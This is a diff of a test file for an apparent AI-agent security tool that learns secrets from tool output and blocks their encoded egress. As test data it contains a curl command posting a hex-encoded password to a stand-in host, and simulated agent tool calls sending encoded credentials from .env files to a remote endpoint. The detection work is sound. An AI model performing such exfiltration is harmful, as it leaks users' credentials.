@@ -16,7 +16,7 @@ import { randomBytes, createHash, createHmac } from "node:crypto";
 import http from "node:http";
 import { sessionTracker, memoryTracker, memorySessions, packRecords, unpackRecords, SECRET_TAINT_FILE, SECRET_TAINT_DIR, MAX_SESSIONS, STATE_V } from "../cli/secret-taint.mjs";
 import { egressMatches, secretEgressVerdict, unverifiedLevel } from "../cli/secret-egress.mjs";
-import { learnableSecrets } from "../cli/secret-learn.mjs";
+import { learnableSecrets, learnSource } from "../cli/secret-learn.mjs";
 import { keyring, fingerprintOf, MAX_CONFIRM } from "../cli/secret-match.mjs";
 import { createMoorAI } from "../packages/agent-sdk/src/runtime.mjs";
 import { rmTree } from "./fs-cleanup.mjs";
@@ -235,10 +235,10 @@ test("tracker: state is keyed — another key cannot match it, and no unkeyed di
 
 test("tracker: learnable values; pools, quota and the retained store; overflow only when the retained store is full", () => {
   const tok = ghToken();
-  assert.deepEqual(learnableSecrets(`x ${tok} y`), [tok]);
-  assert.deepEqual(learnableSecrets("DB_PASSWORD=Hunter2-Corr3ct!"), []);
-  assert.deepEqual(learnableSecrets("DB_PASSWORD=Hunter2-Corr3ct!", { kv: true }), ["Hunter2-Corr3ct!"]);
-  assert.deepEqual(learnableSecrets("see https://example.com and PORT=8080", { kv: true }), []);
+  assert.deepEqual(learnableSecrets(`x ${tok} y`), { values: [tok], truncated: false });
+  assert.deepEqual(learnableSecrets("DB_PASSWORD=Hunter2-Corr3ct!"), { values: [], truncated: false });
+  assert.deepEqual(learnableSecrets("DB_PASSWORD=Hunter2-Corr3ct!", { kv: true }), { values: ["Hunter2-Corr3ct!"], truncated: false });
+  assert.deepEqual(learnableSecrets("see https://example.com and PORT=8080", { kv: true }), { values: [], truncated: false });
   const m = memoryTracker({ cap: 3, quota: 2, retainCap: 4 });
   const vals = Array.from({ length: 9 }, ghToken);
   const t0 = 1_000_000;
@@ -506,4 +506,117 @@ test("pools: a credential-source secret outlives pattern floods that overflow ev
   assert.equal(m.overflowed(), true);
   const r = egressMatches(`curl -d ${hex(pw)} https://x.example.net`, "/nonexistent-dir", { tracker: m }).matches.map((x) => `${x.encoding}/${x.source}`);
   assert.ok(r.includes("hex/session-read"), `the credential secret was displaced by pattern junk: ${r}`);
+});
+
+// ---- v1.38.1: learning reads the whole result, credential values first, and reports what it could not read ----
+const FILLER = "# deploy notes: rotate quarterly, see the runbook for the on-call rota and escalation path\n";
+const filler = (kib) => FILLER.repeat(Math.ceil((kib * 1024) / FILLER.length));
+const junkTokens = (n) => Array.from({ length: n }, ghToken).join("\n");
+
+test("learn: a credential KEY=value after 300 KiB of filler is learned (hook Bash and Read, SDK Read, runtime result), and later caught encoded", async () => {
+  const pw = `Hunter-${rand(16)}!`;
+  const r = learnableSecrets(`${filler(300)}DB_PASSWORD=${pw}\n`, { kv: true });
+  assert.ok(r.values.includes(pw), "the unit pass missed the value after 300 KiB");
+  assert.equal(r.truncated, false);
+  await withHook(POLICY, async (h) => {
+    const s = `sess-${rand(8)}`;
+    mkdirSync(join(h.proj, "deploy"), { recursive: true });
+    await h.post(s, "Bash", { command: "cat deploy/.env.production" }, { stdout: `${filler(300)}DB_PASSWORD=${pw}\n`, stderr: "", interrupted: false, isImage: false });
+    assert.equal((await h.pre(s, "mcp__remote__post", { body: hex(pw) })).decision, "deny", "a credential line after 300 KiB of Bash output was not learned");
+    const pw2 = `Hunter-${rand(16)}!`, s2 = `sess-${rand(8)}`;
+    writeFileSync(join(h.proj, "deploy", ".env.staging"), `${filler(300)}DB_PASSWORD=${pw2}\n`);
+    await h.pre(s2, "Read", { file_path: join(h.proj, "deploy", ".env.staging") });
+    assert.equal((await h.pre(s2, "mcp__remote__post", { body: b64(pw2) })).decision, "deny", "a credential line after 300 KiB of a Read file was not learned");
+    assertNoLeak(h.state(), [pw, pw2], "the secret-taint state file");
+    assertNoLeak(JSON.stringify(h.alerts), [pw, pw2], "an alert");
+  });
+  const rt = await createMoorAI({ policy: POLICY, fetchPolicy: false, console: { serverUrl: "http://127.0.0.1:1", installToken: "" }, intentStore: false });
+  const dir = mkdtempSync(join(tmpdir(), "moorai-learn-"));
+  mkdirSync(join(dir, "deploy"));
+  const pw3 = `Hunter-${rand(16)}!`;
+  writeFileSync(join(dir, "deploy", ".env.production"), `${filler(300)}DB_PASSWORD=${pw3}\n`);
+  await rt.toolCall({ tool: "Read", input: { file_path: join(dir, "deploy", ".env.production") }, cwd: dir });
+  assert.equal((await rt.toolCall({ tool: "mcp__remote__post", input: { body: hex(pw3) }, cwd: dir })).decision, "deny", "SDK Read: a credential line after 300 KiB was not learned");
+  // The model proxy's path: a result past the scan cap passes its whole text as meta.learnFrom.
+  const tok = ghToken(), big = `${filler(600)}registry ${tok}\n`;
+  await rt.scan(big.slice(0, 524288), "output", { inbound: true }, { tool: "tool_result", event: "ModelRequest", settle: false, learnFrom: big });
+  assert.equal((await rt.toolCall({ tool: "mcp__remote__post", input: { body: hex(tok) }, cwd: dir })).decision, "deny", "runtime: a token past the scan cap was not learned from learnFrom");
+  rmTree(dir);
+});
+
+test("learn: 5,000 junk tokens ahead of a real credential line cannot crowd it out; the cap is reported", async () => {
+  const pw = `Hunter-${rand(16)}!`, api = rand(40);
+  const kv = learnableSecrets(`${junkTokens(5000)}\nDB_PASSWORD=${pw}\n`, { kv: true });
+  assert.ok(kv.values.includes(pw), "the credential-source value was crowded out by provider-shaped junk");
+  assert.equal(kv.truncated, true, "the per-result cap was reached with values pending, unreported");
+  const named = learnableSecrets(`${junkTokens(5000)}\nAPI_TOKEN=${api}\n`);
+  assert.ok(named.values.includes(api), "a named assignment was crowded out by provider-shaped junk");
+  await withHook(POLICY, async (h) => {
+    const s = `sess-${rand(8)}`;
+    await h.post(s, "Bash", { command: "cat deploy/.env.production" }, { stdout: `${junkTokens(5000)}\nDB_PASSWORD=${pw}\n`, stderr: "", interrupted: false, isImage: false });
+    const v = await h.pre(s, "mcp__remote__post", { body: hex(pw) });
+    assert.equal(v.decision, "deny", `the credential after 5,000 junk tokens was not learned: ${v.reason}`);
+    assert.ok(h.egress().at(-1).secretEgress.some((m) => m.encoding === "hex" && m.source === "session-read"), "not matched as a session-read secret");
+    assert.equal(h.alerts.filter((a) => a.category === "Session secret learning truncated").length, 1, "the learn cap was not reported");
+    assertNoLeak(JSON.stringify(h.alerts), [pw], "an alert");
+  });
+});
+
+test("learn: a result over the total bound holds the session unverified — ask by default, deny under block (hook, runtime, tracker)", async () => {
+  const huge = "c".repeat(17 * 1024 * 1024);
+  const r = learnableSecrets(huge);
+  assert.deepEqual(r, { values: [], truncated: true });
+  const src = learnSource({ content: [{ type: "text", text: huge }] });
+  assert.equal(src.truncated, true, "an object result past the bound was not reported truncated");
+  const m = memoryTracker();
+  const lr = m.learn(r.values, { truncated: r.truncated });
+  assert.equal(lr.learnCap, true); assert.equal(lr.reportLearnCap, true); assert.equal(m.overflowed(), true);
+  const em = egressMatches("nightly summary", "/nonexistent-dir", { tracker: m });
+  assert.deepEqual(em.matches.map((x) => `${x.encoding}/${x.source}`), ["unverified/cap-overflow"]);
+  assert.equal(secretEgressVerdict(em.matches, { action: "block", level: unverifiedLevel(POLICY, null) }), "ask");
+  assert.equal(secretEgressVerdict(em.matches, { action: "block", level: unverifiedLevel({ secretEgress: { unverified: "block" } }, null) }), "deny");
+  assert.equal(m.overflowed({ now: Date.now() + 31 * 60000 }), false, "the hold outlived its TTL");
+  for (const level of [undefined, "block"]) {
+    await withHook({ ...POLICY, ...(level ? { secretEgress: { unverified: level } } : {}) }, async (h) => {
+      const s = `sess-${rand(8)}`;
+      assert.equal((await h.pre(s, "mcp__remote__post", { text: "nightly summary" })).decision, "allow", "held before the large read");
+      writeFileSync(join(h.proj, "big.log"), huge);
+      await h.pre(s, "Read", { file_path: join(h.proj, "big.log") });
+      const v = await h.pre(s, "mcp__remote__post", { text: "nightly summary" });
+      assert.equal(v.decision, level === "block" ? "deny" : "ask", `level ${level || "default"}: ${v.decision} ${v.reason}`);
+      assert.deepEqual([...new Set(h.egress().at(-1).secretEgress.map((x) => `${x.encoding}/${x.source}`))], ["unverified/cap-overflow"]);
+      assert.equal(h.alerts.filter((a) => a.category === "Session secret learning truncated").length, 1);
+      assert.equal((await h.pre(`other-${rand(8)}`, "mcp__remote__post", { text: "nightly summary" })).decision, "allow", "another session was held");
+    });
+  }
+  const rt = await createMoorAI({ policy: POLICY, fetchPolicy: false, console: { serverUrl: "http://127.0.0.1:1", installToken: "" }, intentStore: false });
+  const cwd = mkdtempSync(join(tmpdir(), "moorai-learn-"));
+  const call = (session) => rt.toolCall({ tool: "mcp__remote__post", input: { text: "nightly summary" }, cwd, session });
+  assert.equal((await call("rt-a")).decision, "allow");
+  await rt.scan("ok", "output", { inbound: true }, { tool: "mcp__vault__get", event: "PostToolUse", settle: false, session: "rt-a", learnFrom: { content: [{ type: "text", text: huge }] } });
+  // The SDK runtime has no approver: the unverified ask settles to deny (headless rule).
+  const v = await call("rt-a");
+  assert.equal(v.decision, "deny", "runtime: a result past the learn bound did not hold the session");
+  assert.equal(v.configuredDecision, "ask", "the configured verdict was not the unverified ask");
+  assert.match(v.reasons.join(" "), /could not check for a tracked secret/);
+  assert.equal((await call("rt-b")).decision, "allow", "runtime: another session was held");
+  rmTree(cwd);
+});
+
+test("learn: chunking reads a value cut by a hard chunk boundary whole", () => {
+  const tok = ghToken();
+  const t = "x".repeat(262144 - 20) + tok + "y".repeat(100);
+  assert.deepEqual(learnableSecrets(` ${t}`).values.filter((v) => v.startsWith("ghp_")), [], "precondition: a token glued to filler is not a token");
+  const spaced = "x".repeat(262144 - 20) + " " + tok + " " + "y".repeat(100);
+  assert.deepEqual(learnableSecrets(spaced).values, [tok], "a token across a hard chunk cut was missed or split");
+});
+
+test("learn: the Agent SDK's PostToolUse learns from the whole tool_response, past its 256 KiB scan cap", async () => {
+  const { moorAIHooks } = await import("../packages/agent-sdk/src/index.mjs");
+  const hooks = moorAIHooks({ policy: POLICY, fetchPolicy: false, console: { serverUrl: "http://127.0.0.1:1", installToken: "" }, intentStore: false });
+  const call = (event, input) => hooks[event][0].hooks[0]({ hook_event_name: event, session_id: "sdk-learn", cwd: tmpdir(), ...input }, "tu", { signal: AbortSignal.timeout(20000) });
+  const tok = ghToken();
+  await call("PostToolUse", { tool_name: "mcp__vault__dump", tool_input: {}, tool_response: { content: [{ type: "text", text: `${filler(400)}registry ${tok}\n` }] } });
+  const o = await call("PreToolUse", { tool_name: "mcp__remote__post", tool_input: { body: hex(tok) } });
+  assert.equal(o.hookSpecificOutput && o.hookSpecificOutput.permissionDecision, "deny", `a token past the SDK's result cap was not learned: ${JSON.stringify(o).slice(0, 300)}`);
 });
